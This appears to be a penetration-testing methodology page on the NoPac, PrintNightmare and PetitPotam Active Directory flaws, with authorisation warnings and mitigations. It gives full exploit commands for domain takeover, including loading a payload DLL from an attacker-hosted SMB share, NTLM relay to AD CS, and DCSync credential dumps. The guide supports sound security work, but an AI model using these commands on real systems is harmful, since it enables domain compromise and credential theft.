---
layout: page
title: "Bleeding-Edge Vulnerabilities"
subtitle: "High-impact AD flaws from 2021 that give domain takeover when a host is unpatched"
permalink: /methodology/active-directory/bleeding-edge-vulns/
---

Some AD vulnerabilities give domain-level control from a low-privilege or unauthenticated position. The notes cover three that were disclosed in 2021: NoPac (SamAccountName spoofing), PrintNightmare (Print Spooler), and PetitPotam (MS-EFSRPC coercion). These are high-impact and can crash services or change production state, so check the rules of engagement first, test only where allowed, and confirm the patch status with the client before you run anything.

## Workflow

1. Check the patch level and the relevant configuration.
2. Run the non-destructive scanner or the protocol enumeration first.
3. Exploit only with written approval, and record exactly what you changed.
4. Remove any service, share, or machine account you created.

## NoPac (SamAccountName spoofing)

NoPac chains two flaws: CVE-2021-42278, a bypass in the Security Account Manager, and CVE-2021-42287, a weakness in how the KDC handles the Privilege Attribute Certificate (PAC). Together they let any standard domain user become a domain admin in one command. The attack renames a computer account it created to match a DC's SAM account name, then requests a ticket that the KDC treats as the DC's.

Preconditions:

- Any valid domain user account.
- `ms-DS-MachineAccountQuota` above zero. The default is 10, which lets any authenticated user add computer accounts.

Check first with the scanner:

```bash
sudo python3 scanner.py DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -use-ldap
```

If the scanner reports a TGT from the DC, run the exploit with a shell or with a DCSync dump limited to one account:

```bash
sudo python3 noPac.py DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -dc-host DC_HOST --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator
```

The tool saves a TGT, which can be reused for pass-the-ticket or DCSync. It also creates a temporary service on the target to run commands, so expect service-creation events.

## PrintNightmare (Print Spooler)

The Print Spooler service runs on Windows hosts and can be abused for privilege escalation and remote code execution. First confirm that the MS-RPRN and MS-PAR interfaces are reachable:

```bash
rpcdump.py @DC_IP | egrep 'MS-RPRN|MS-PAR'
```

The exploit loads a DLL from an SMB share that you control, so the target must reach your host over SMB. Host the payload with `smbserver.py`, configure a listener for the callback, and run the exploit against the target:

```bash
sudo smbserver.py -smb2support SHARE /path/to/payload.dll
sudo python3 CVE-2021-1675.py DOMAIN/USERNAME:PASSWORD@DC_IP '\\ATTACKER_IP\SHARE\payload.dll'
```

A successful run gives a SYSTEM shell on the listener.

## PetitPotam (MS-EFSRPC)

PetitPotam coerces a domain controller to authenticate to another host over NTLM, using the MS-EFSRPC protocol, which runs over port 445 through LSARPC. When AD CS is in use, you can relay that authentication to the CA's web enrollment page and request a certificate for the DC's machine account. That certificate can then be used to request a TGT, and from there a DCSync.

Relay setup, targeting the CA's web enrollment endpoint:

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://CA_HOST/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py ATTACKER_IP DC_IP
```

Use the base64 certificate from the relay output to request a TGT, then use it for DCSync:

```bash
python3 gettgtpkinit.py -pfx-base64 BASE64_CERT 'DOMAIN/DC_HOST$' dc.ccache
export KRB5CCNAME=dc.ccache
secretsdump.py -just-dc-user DOMAIN/administrator -k -no-pass 'DC_HOST$'@DC_HOST.DOMAIN
```

The notes also describe using the DC machine account's ticket to request the NT hash of the account that owns the ticket. That step runs over Kerberos U2U with the PAC.

## What to look for

- Standard domain users with `ms-DS-MachineAccountQuota` above zero (NoPac)
- Print Spooler reachable on DCs and servers (PrintNightmare)
- AD CS web enrollment reachable over HTTP with NTLM enabled (PetitPotam)

## Pitfalls

- Each of these can change state on a production DC. Get explicit written approval, a maintenance window, and a rollback plan.
- Scanners can give false confidence. A vulnerable version does not always mean the attack will succeed.
- Clean up every machine account, service, or DLL you add, and report the artifacts.

## Defense

PetitPotam mitigations from the notes:

- Enable Extended Protection for Authentication and require SSL on the CA web enrollment and certificate enrollment web services.
- Disable NTLM authentication for domain controllers, and restrict NTLM on AD CS servers through Group Policy.
- Disable NTLM for IIS on AD CS servers that run the enrollment services.

For NoPac, reduce `ms-DS-MachineAccountQuota` to 0 so ordinary users cannot create computer accounts. For all three, patch the affected systems and confirm the patch level in the report.
